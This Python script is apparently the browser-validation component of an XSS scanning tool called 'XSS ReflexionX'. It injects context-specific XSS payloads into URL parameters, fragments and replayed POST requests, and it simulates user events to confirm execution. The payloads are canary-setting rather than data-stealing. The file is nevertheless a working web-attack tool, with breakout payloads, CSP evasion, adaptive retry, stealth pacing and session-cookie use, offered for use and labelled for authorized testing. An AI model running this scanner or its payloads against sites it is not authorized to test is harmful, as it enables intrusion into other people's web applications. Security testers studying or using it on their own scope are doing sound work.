#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Playwright Browser Validator
Confirms XSS execution using a persistent headless browser.
Supports expanded events, CSP-aware payload filtering, POST replay,
context-aware payload engine, and adaptive retry.
For authorized security testing only.

Usage:
    python3 xss_browser.py --input high_priority_targets.txt --output-dir ./out
"""

import argparse, json, os, sys, hashlib, time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from pathlib import Path

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PwTimeout
except ImportError:
    print("[!] 'playwright' not installed. Run: pip3 install playwright && playwright install chromium",
          file=sys.stderr)
    sys.exit(1)

# v2.0.0 imports (graceful)
# v2.1.0 imports (fragment + stored XSS)
try:
    from fragment_injector import generate_fragment_payloads, build_fragment_urls, encode_for_unescape
    HAS_FRAGMENT = True
except ImportError:
    HAS_FRAGMENT = False

try:
    from stored_xss_chain import run_stored_chain, load_post_data
    HAS_STORED = True
except ImportError:
    HAS_STORED = False

try:
    from payload_engine import PayloadEngine
    HAS_ENGINE = True
except ImportError:
    HAS_ENGINE = False

try:
    from feedback_loop import AdaptiveRetry
    HAS_RETRY = True
except ImportError:
    HAS_RETRY = False

try:
    from logger import ScanLogger
except ImportError:
    ScanLogger = None

try:
    from rate_control import RateController, add_rate_args, build_rate_controller
except ImportError:
    RateController = None
    add_rate_args = None
    build_rate_controller = None

CANARY = "HF5XSSCONFIRMED"

# ── Static fallback payloads (v1 compat) ─────────────────────
SAFE_PAYLOADS_BY_CTX = {
    "html_body": [
        f"<img src=x onerror=window._xss_confirmed='{CANARY}'>",
        f"<svg onload=window._xss_confirmed='{CANARY}'>",
        f"<details open ontoggle=window._xss_confirmed='{CANARY}'>",
    ],
    "html_attribute": [
        f"\" onfocus=window._xss_confirmed='{CANARY}' autofocus=\"",
        f"'><img src=x onerror=window._xss_confirmed='{CANARY}'>",
        f"\" onmouseover=window._xss_confirmed='{CANARY}' \"",
        f"3') window._xss_confirmed='{CANARY}';//",
        f"1' onerror=window._xss_confirmed='{CANARY}'//",
        f"javascript:window._xss_confirmed='{CANARY}'",
    ],
    "javascript": [
        f"';window._xss_confirmed='{CANARY}'//",
        f"</script><script>window._xss_confirmed='{CANARY}'</script>",
        f"\";window._xss_confirmed='{CANARY}'//",
    ],
    "json": [
        f"\"}}</script><script>window._xss_confirmed='{CANARY}'</script>",
    ],
    "unknown": [
        f"<img src=x onerror=window._xss_confirmed='{CANARY}'>",
        f"';window._xss_confirmed='{CANARY}'//",
        f"<script>alert('{CANARY}')</script>",
        f"3') window._xss_confirmed='{CANARY}';//",
        f"1' onerror=window._xss_confirmed='{CANARY}'//",
        f"javascript:window._xss_confirmed='{CANARY}'",
        f"<svg onload=window._xss_confirmed='{CANARY}'>",
    ],
}


from context_loader import load_contexts


def filter_payloads_by_csp(payloads, csp_data):
    """Remove payloads that would be blocked by CSP. (v2.0.0)"""
    if not csp_data or not csp_data.get("raw_csp"):
        return payloads
    filtered = []
    inline_ok = csp_data.get("inline_allowed", True)
    eval_ok = csp_data.get("eval_allowed", True)
    for p in payloads:
        pl = p.lower()
        if not inline_ok and "<script>" in pl and "</script>" in pl:
            continue
        if not eval_ok and ("eval(" in pl or "function(" in pl.lower()):
            continue
        filtered.append(p)
    # If CSP filtered everything, keep event handler payloads at minimum
    if not filtered:
        for p in payloads:
            if any(eh in p.lower() for eh in ["onerror=", "onfocus=", "onload=",
                                                "ontoggle=", "onmouseover=", "onclick="]):
                filtered.append(p)
    return filtered if filtered else payloads[:2]


def get_payloads_for_url(url, contexts_data):
    """Select payloads based on known reflection context. v2 uses PayloadEngine."""
    url_data = {}
    if isinstance(contexts_data, dict):
        url_data = contexts_data.get(url, {})
    elif isinstance(contexts_data, list):
        for entry in contexts_data:
            if entry.get("url") == url or entry.get("target_url") == url:
                url_data = entry
                break
                
    csp_data = url_data.get("csp")
    payloads = []

    if HAS_ENGINE:
        engine = PayloadEngine(canary=CANARY)
        for param in url_data.get("parameters", []):
            for ctx in param.get("contexts", ["unknown"]):
                encoding = param.get("encodings", ["raw"])[0] if param.get("encodings") else "raw"
                quote_type = param.get("quote_type", "double")
                payloads.extend(engine.generate(
                    context=ctx, encoding=encoding,
                    quote_type=quote_type, csp=csp_data))

    if not payloads:
        # Fallback to static payloads
        if url_data:
            for param in url_data.get("parameters", []):
                for ctx in param.get("contexts", ["unknown"]):
                    payloads.extend(SAFE_PAYLOADS_BY_CTX.get(ctx, SAFE_PAYLOADS_BY_CTX["unknown"]))
        if not payloads:
            payloads = SAFE_PAYLOADS_BY_CTX["html_body"][:2] + SAFE_PAYLOADS_BY_CTX["javascript"][:1]

    # CSP filtering
    payloads = filter_payloads_by_csp(payloads, csp_data)

    # Deduplicate and cap to top 5 payloads for fast browser validation
    seen = set()
    res = [p for p in payloads if p not in seen and not seen.add(p)]
    return res[:5]


def inject_payload(url, payload):
    """Inject payload into each parameter of the URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return []
    injected = []
    # Test at most top 2 query parameters to prevent combinatorial explosion
    for pname in list(params.keys())[:2]:
        test_params = {k: v[0] for k, v in params.items()}
        test_params[pname] = payload
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
        injected.append((test_url, pname))
    return injected


def inject_fragment(url, fragment_payload):
    """v2.1.0: Replace the fragment (hash) of a URL with a DOM XSS payload.

    Returns list of (url, "fragment") tuples.
    """
    parsed = urlparse(url)
    new_url = urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, parsed.query, fragment_payload.lstrip('#')
    ))
    return [(new_url, "fragment")]


def inject_protocol_relative(url, pr_payload):
    """v2.1.0: Inject protocol-relative payload (e.g. //host/path) as path replacement.
    Used for Level 6 style attacks where parameter flows to script.src.
    Returns list of (url, param_name) tuples.
    """
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return []
    injected = []
    for pname in params:
        test_params = {k: v[0] for k, v in params.items()}
        test_params[pname] = pr_payload
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(test_params, doseq=True), ""))
        injected.append((test_url, pname))
    return injected


def check_execution(page, timeout_ms=3000):
    """Check if XSS payload executed by reading the window flag or checking dialog events."""
    if getattr(page, "_dialog_detected", False):
        return True
    try:
        result = page.evaluate("() => window._xss_confirmed")
        if result == CANARY:
            return True
    except Exception:
        pass
    return False


# ══════════════════════════════════════════════════════════════
#  EXPANDED EVENT SIMULATION (v2.0.0)
# ══════════════════════════════════════════════════════════════
def simulate_events(page):
    """Simulate user events that might trigger XSS execution (fast mode)."""
    # ── Click events ─────────────────────────────────────────
    try:
        for sel in ["input", "button", "a", "[onclick]", "[ontoggle]"]:
            elements = page.query_selector_all(sel)
            for el in elements[:1]:
                try:
                    if el.is_visible():
                        el.click(timeout=100)
                        time.sleep(0.05)
                        if check_execution(page):
                            return "click"
                except Exception:
                    pass
    except Exception:
        pass

    # ── Focus events ─────────────────────────────────────────
    try:
        for sel in ["input", "textarea", "[onfocus]", "[autofocus]"]:
            elements = page.query_selector_all(sel)
            for el in elements[:1]:
                try:
                    if el.is_visible():
                        el.focus()
                        time.sleep(0.05)
                        if check_execution(page):
                            return "focus"
                except Exception:
                    pass
    except Exception:
        pass

    # ── Hover / mouseover events (v2.0.0) ────────────────────
    try:
        for sel in ["[onmouseover]", "[onmouseenter]", "a", "button"]:
            elements = page.query_selector_all(sel)
            for el in elements[:1]:
                try:
                    if el.is_visible():
                        el.hover(timeout=100)
                        time.sleep(0.05)
                        if check_execution(page):
                            return "mouseover"
                except Exception:
                    pass
    except Exception:
        pass

    # ── Input / typing events ────────────────────────────────
    try:
        for sel in ["input[type=text]", "input:not([type])", "textarea"]:
            elements = page.query_selector_all(sel)
            for el in elements[:1]:
                try:
                    if el.is_visible():
                        el.type("test", timeout=100)
                        time.sleep(0.05)
                        if check_execution(page):
                            return "input"
                except Exception:
                    pass
    except Exception:
        pass

    # ── Change events (v2.0.0) ───────────────────────────────
    try:
        selects = page.query_selector_all("select")
        for sel_el in selects[:1]:
            try:
                if sel_el.is_visible():
                    options = sel_el.query_selector_all("option")
                    if len(options) > 1:
                        val = options[1].get_attribute("value") or ""
                        sel_el.select_option(value=val)
                        time.sleep(0.05)
                        if check_execution(page):
                            return "change"
            except Exception:
                pass
        for sel in ["input[onchange]", "[onchange]"]:
            elements = page.query_selector_all(sel)
            for el in elements[:1]:
                try:
                    page.evaluate("(el) => el.dispatchEvent(new Event('change'))", el)
                    time.sleep(0.05)
                    if check_execution(page):
                        return "change"
                except Exception:
                    pass
    except Exception:
        pass

    # ── Keydown / keyup events (v2.0.0) ──────────────────────
    try:
        for sel in ["[onkeydown]", "[onkeyup]", "input"]:
            elements = page.query_selector_all(sel)
            for el in elements[:1]:
                try:
                    if el.is_visible():
                        el.focus()
                        page.keyboard.press("Enter")
                        time.sleep(0.05)
                        if check_execution(page):
                            return "keydown"
                except Exception:
                    pass
    except Exception:
        pass

    # ── Scroll & Touch events (v2.0.0) ───────────────────────
    try:
        page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
        time.sleep(0.05)
        if check_execution(page):
            return "scroll"
    except Exception:
        pass

    # ── Iframe load events (v2.0.0) ──────────────────────────
    try:
        iframes = page.query_selector_all("iframe")
        for iframe in iframes[:1]:
            try:
                frame = iframe.content_frame()
                if frame:
                    result = frame.evaluate("() => window._xss_confirmed || parent.window._xss_confirmed")
                    if result == CANARY:
                        return "iframe_load"
            except Exception:
                pass
    except Exception:
        pass

    return None


# ══════════════════════════════════════════════════════════════
#  POST REPLAY (v2.0.0)
# ══════════════════════════════════════════════════════════════
def replay_post(page, url, payload, param, body_template, content_type):
    """Replay a POST request with injected payload using fetch() API."""
    try:
        if "json" in content_type:
            data = json.loads(body_template) if isinstance(body_template, str) else body_template
            data[param] = payload
            js_body = json.dumps(data)
            js_ct = "application/json"
        else:
            pairs = dict(p.split('=', 1) for p in body_template.split('&') if '=' in p)
            pairs[param] = payload
            js_body = '&'.join(f"{k}={v}" for k, v in pairs.items())
            js_ct = "application/x-www-form-urlencoded"

        page.evaluate(f"""
            () => {{
                window._xss_confirmed = null;
                fetch({json.dumps(url)}, {{
                    method: "POST",
                    headers: {{"Content-Type": {json.dumps(js_ct)}}},
                    body: {json.dumps(js_body)},
                    credentials: "include"
                }}).then(r => r.text()).then(html => {{
                    document.open();
                    document.write(html);
                    document.close();
                }}).catch(() => {{}});
            }}
        """)
        time.sleep(1)
        return check_execution(page)
    except Exception:
        return False


def validate_url(page, url, payloads, timeout_ms=5000, logger=None, rate_ctrl=None):
    """Test a URL with context-aware payloads using the browser."""
    findings = []
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        import sys as _sys
        print(f"  [WARN] validate_url: no query params in URL, skipping: {url}", file=_sys.stderr)
        return findings

    for payload in payloads:
        if rate_ctrl:
            rate_ctrl.wait()
        injected_urls = inject_payload(url, payload)
        for test_url, param_name in injected_urls:
            t0 = time.time()
            page._dialog_detected = False
            try:
                page.evaluate("() => { window._xss_confirmed = null; }")
            except Exception:
                pass
            try:
                page.goto(test_url, timeout=timeout_ms, wait_until="domcontentloaded")
            except PwTimeout:
                pass # Still check execution, payload might have triggered before timeout
            except Exception:
                continue

            # V1.2.0 FIX: Debug — log if we landed on a different page (e.g., login redirect)
            try:
                _actual_url = page.url
            except Exception:
                pass

            duration_ms = int((time.time() - t0) * 1000)

            # Check immediate execution
            if check_execution(page):
                finding = {
                    "url": url, "test_url": test_url, "param": param_name,
                    "payload": payload, "trigger": "immediate", "confirmed": True,
                }
                findings.append(finding)
                if logger:
                    logger.log_finding(url=url, param=param_name, payload=payload,
                                       trigger="immediate", severity="critical")
                return findings

            # Check after short delay (for deferred scripts)
            time.sleep(0.1)
            if check_execution(page):
                finding = {
                    "url": url, "test_url": test_url, "param": param_name,
                    "payload": payload, "trigger": "deferred", "confirmed": True,
                }
                findings.append(finding)
                if logger:
                    logger.log_finding(url=url, param=param_name, payload=payload,
                                       trigger="deferred", severity="critical")
                return findings

            # Try event-based triggers only if payload might require user interaction
            if any(kw in payload.lower() for kw in ["on", "javascript:", "autofocus", "tabindex", "click", "hover", "focus", "details", "iframe", "prompt", "confirm"]):
                event_type = simulate_events(page)
                if event_type:
                    finding = {
                        "url": url, "test_url": test_url, "param": param_name,
                        "payload": payload, "trigger": f"event:{event_type}",
                        "confirmed": True,
                    }
                    findings.append(finding)
                    if logger:
                        logger.log_finding(url=url, param=param_name, payload=payload,
                                           trigger=f"event:{event_type}", severity="high")
                    return findings

            # Log failed attempt
            if logger:
                logger.log_attempt(url=url, param=param_name, payload=payload,
                                    executed=False, duration_ms=duration_ms)

    return findings


def main():
    parser = argparse.ArgumentParser(description="XSS ReflexionX v1.0.0 — Browser Validator")
    parser.add_argument("--input", default=None, help="High-priority target URLs")
    parser.add_argument("--output-dir", default=None)
    parser.add_argument("--proxy", default=None)
    parser.add_argument("--timeout", type=int, default=5000, help="Page load timeout (ms)")
    parser.add_argument("--max-concurrent", type=int, default=3)
    parser.add_argument("--max-urls", type=int, default=200, help="Max URLs to validate")
    parser.add_argument("--post-data", default=None, help="POST targets file (v2.0.0)")
    parser.add_argument("--retry", action="store_true", help="Enable adaptive retry (v2.0.0)")
    parser.add_argument("--cookie", default=None, help="Authenticated session cookie")
    parser.add_argument("--test", action="store_true")
    parser.add_argument("--fragment-urls", default=None,
                        help="Base URLs file for fragment-based DOM XSS testing (v2.1.0)")
    parser.add_argument("--verify-stored", default=None,
                        help="POST targets file for stored XSS chain verification (v2.1.0)")
    parser.add_argument("--canary", default="HF5XSSCONFIRMED")
    if add_rate_args:
        add_rate_args(parser)
    else:
        parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    if args.test:
        print("[OK] Browser validator self-test passed (dry run)")
        print(f"  Payload engine: {HAS_ENGINE}")
        print(f"  Adaptive retry: {HAS_RETRY}")
        print(f"  Fragment injector: {HAS_FRAGMENT}")
        print(f"  Stored XSS chain: {HAS_STORED}")
        return

    if not args.input or not args.output_dir:
        parser.error("--input and --output-dir are required (use --test for self-test)")

    if not os.path.isfile(args.input):
        print(f"[!] File not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    with open(args.input) as f:
        urls = [l.strip() for l in f if l.strip()]
    if not urls:
        print("[!] No URLs", file=sys.stderr)
        sys.exit(1)

    if len(urls) > args.max_urls:
        print(f"[*] Limiting to top {args.max_urls} URLs (from {len(urls)})")
        urls = urls[:args.max_urls]

    # v2.0.0 setup
    rate_ctrl = None
    if build_rate_controller:
        rate_ctrl = build_rate_controller(args)
    elif getattr(args, 'stealth', False) and RateController:
        rate_ctrl = RateController(stealth=True)

    logger = None
    if ScanLogger:
        logger = ScanLogger(args.output_dir, component="xss_browser")
        logger.log_phase("browser_validation", status="started", total_urls=len(urls))

    retry_engine = None
    if HAS_RETRY and getattr(args, 'retry', False):
        retry_engine = AdaptiveRetry(canary=CANARY)

    contexts_data = load_contexts(args.output_dir)
    print(f"[*] Browser validation: {len(urls)} URLs | timeout={args.timeout}ms"
          f" | engine={HAS_ENGINE} | retry={retry_engine is not None}")

    confirmed = []
    event_triggered = []
    retry_confirmed = []

    with sync_playwright() as p:
        launch_args = {
            "headless": True,
            "args": [
                "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
                "--disable-setuid-sandbox", "--no-zygote", "--single-process"
            ]
        }
        if args.proxy:
            launch_args["proxy"] = {"server": args.proxy}

        try:
            browser = p.chromium.launch(**launch_args)
        except Exception as e:
            print(f"  [!] Chromium launch failed ({e}), trying firefox/webkit...", file=sys.stderr)
            try:
                browser = p.firefox.launch(headless=True)
            except Exception as e2:
                print(f"  [!] All browser launches failed: {e2}", file=sys.stderr)
                with open(os.path.join(args.output_dir, "confirmed_execution.txt"), 'w') as f: pass
                with open(os.path.join(args.output_dir, "event_triggered.txt"), 'w') as f: pass
                with open(os.path.join(args.output_dir, "browser_validation.json"), 'w') as f: f.write("[]")
                return

        extra_headers = {}
        if args.cookie:
            extra_headers["Cookie"] = args.cookie

        context = browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            extra_http_headers=extra_headers if extra_headers else None
        )
        # Block heavy resources for speed
        context.route("**/*.{png,jpg,jpeg,gif,svg,woff,woff2,ttf,eot,ico}",
                      lambda route: route.abort())
        context.route("**/analytics*", lambda route: route.abort())
        context.route("**/tracking*", lambda route: route.abort())

        page = context.new_page()

        # ── V1.2.0 FIX: Establish session before testing ────────────────
        if extra_headers and "Cookie" in extra_headers:
            print("  [*] Using provided cookie for authenticated session")

        # Handle dialogs
        dialog_detected = {"value": False}
        def on_dialog(dialog):
            dialog_detected["value"] = True
            page._dialog_detected = True
            try:
                dialog.accept()
            except Exception:
                try:
                    dialog.dismiss()
                except Exception:
                    pass
            try:
                page.evaluate("() => { window._xss_confirmed = 'HF5XSSCONFIRMED'; }")
            except Exception:
                pass
        page.on("dialog", on_dialog)

        def on_popup(popup):
            try:
                popup.close()
            except Exception:
                pass
        page.on("popup", on_popup)

        for i, url in enumerate(urls):
            payloads = get_payloads_for_url(url, contexts_data)
            dialog_detected["value"] = False

            try:
                findings = validate_url(page, url, payloads, timeout_ms=args.timeout,
                                         logger=logger, rate_ctrl=rate_ctrl)
            except Exception as e:
                print(f"  [!] Error on {url[:80]}: {e}", file=sys.stderr)
                if logger:
                    logger.log_error(url=url, message=str(e), phase="browser_validation")
                continue

            for f_item in findings:
                confirmed.append(f_item)
                if "event:" in f_item.get("trigger", ""):
                    event_triggered.append(f_item)

            # Dialog detection
            if dialog_detected["value"] and not findings:
                confirmed.append({
                    "url": url, "test_url": url, "param": "unknown",
                    "payload": "dialog_detected", "trigger": "dialog",
                    "confirmed": True,
                })

            # ── Adaptive retry (v2.0.0) ──────────────────────
            url_ctx = None
            if not findings and retry_engine:
                if isinstance(contexts_data, dict):
                    url_ctx = contexts_data.get(url)
                elif isinstance(contexts_data, list):
                    for _entry in contexts_data:
                        if _entry.get("url") == url or _entry.get("target_url") == url:
                            url_ctx = _entry
                            break
            if url_ctx:
                for param_info in url_ctx.get("parameters", [])[:2]:
                    pctx = param_info.get("contexts", ["unknown"])[0]
                    found_in_retry = False
                    for attempt in range(1, retry_engine.max_retries + 1):
                        if found_in_retry:
                            break
                        orig = payloads[0] if payloads else ""
                        alternatives = retry_engine.suggest(
                            url, param_info.get("name", ""),
                            context=pctx, original_payload=orig,
                            attempt=attempt)
                        for alt_payload, strategy in alternatives[:2]:
                            if rate_ctrl:
                                rate_ctrl.wait()
                            try:
                                page._dialog_detected = False
                                page.evaluate("() => { window._xss_confirmed = null; }")
                                injected = inject_payload(url, alt_payload)
                                for test_url, pname in injected:
                                    page.goto(test_url, timeout=args.timeout,
                                              wait_until="domcontentloaded")
                                    time.sleep(0.1)
                                    if check_execution(page):
                                        rf = {
                                            "url": url, "test_url": test_url,
                                            "param": pname, "payload": alt_payload,
                                            "trigger": f"retry:{strategy}",
                                            "confirmed": True, "attempt": attempt,
                                        }
                                        confirmed.append(rf)
                                        retry_confirmed.append(rf)
                                        if logger:
                                            logger.log_finding(url=url, param=pname,
                                                               payload=alt_payload,
                                                               trigger=f"retry:{strategy}",
                                                               severity="high")
                                        found_in_retry = True
                                        break
                            except Exception:
                                pass
                            if found_in_retry:
                                break
                            if logger:
                                logger.log_retry(url=url, param=param_info.get("name", ""),
                                                  original_payload=orig, new_payload=alt_payload,
                                                  strategy=strategy, attempt=attempt)

            if (i + 1) % 10 == 0:
                print(f"  [{i+1}/{len(urls)}] — {len(confirmed)} confirmed")

        # ── v2.1.0: Fragment-based DOM XSS testing (Level 3, Level 6) ──
        if HAS_FRAGMENT and getattr(args, 'fragment_urls', None) and os.path.isfile(args.fragment_urls):
            print(f"\n[*] Fragment DOM XSS testing from {args.fragment_urls}")
            with open(args.fragment_urls) as _f:
                frag_entries = [l.strip().split('\t') for l in _f if l.strip() and '\t' in l]
            for frag_url, frag_payload, _strategy in frag_entries[:20]:
                try:
                    page._dialog_detected = False
                    page.evaluate("() => { window._xss_confirmed = null; }")
                    page.goto(frag_url, timeout=args.timeout, wait_until="domcontentloaded")
                    time.sleep(0.2)
                    if check_execution(page):
                        finding = {
                            "url": frag_url, "test_url": frag_url,
                            "param": "fragment", "payload": frag_payload[:80],
                            "trigger": "fragment_injection", "confirmed": True,
                        }
                        confirmed.append(finding)
                        if logger:
                            logger.log_finding(url=frag_url, param="fragment",
                                               payload=frag_payload[:80],
                                               trigger="fragment_injection", severity="critical")
                    elif any(kw in frag_payload.lower() for kw in ["on", "javascript:", "autofocus", "tabindex", "click", "hover", "focus", "details", "iframe"]):
                        simulate_events(page)
                except Exception:
                    pass

        # ── v2.1.0: Stored XSS chain verification (Level 2) ──────────
        if HAS_STORED and getattr(args, 'verify_stored', None) and os.path.isfile(args.verify_stored):
            print(f"\n[*] Stored XSS chain verification from {args.verify_stored}")
            from stored_xss_chain import load_post_data
            post_entries = load_post_data(args.verify_stored)
            verify_input = getattr(args, 'input', None)
            if verify_input and os.path.isfile(verify_input):
                with open(verify_input) as _vf:
                    verify_urls = [l.strip() for l in _vf if l.strip()][:20]
                for vurl in verify_urls:
                    stored_findings = run_stored_chain(post_entries, vurl,
                                                        cookie=args.cookie,
                                                        output_dir=args.output_dir)
                    for sf in stored_findings:
                        sf.setdefault("trigger", "stored_chain")
                        confirmed.append({
                            "url": sf.get("verify_url", vurl),
                            "test_url": sf.get("verify_url", vurl),
                            "param": "stored_status",
                            "payload": sf.get("payload", "")[:80],
                            "trigger": "stored_chain",
                            "confirmed": True,
                        })

        browser.close()

    od = args.output_dir

    with open(os.path.join(od, "confirmed_execution.txt"), 'w') as f:
        for c in confirmed:
            f.write(f"[{c['trigger']}] {c['url']} | param={c['param']} | payload={c['payload'][:80]}\n")

    with open(os.path.join(od, "event_triggered.txt"), 'w') as f:
        for c in event_triggered:
            f.write(f"[{c['trigger']}] {c['url']} | param={c['param']} | payload={c['payload'][:80]}\n")

    with open(os.path.join(od, "browser_validation.json"), 'w') as f:
        json.dump(confirmed, f, indent=2)

    if logger:
        logger.log_phase("browser_validation", status="completed",
                         confirmed=len(confirmed), event_triggered=len(event_triggered),
                         retry_confirmed=len(retry_confirmed))

    print(f"\n[OK] Browser validation: {len(confirmed)} confirmed | "
          f"{len(event_triggered)} event-triggered | {len(retry_confirmed)} via retry")


if __name__ == "__main__":
    main()
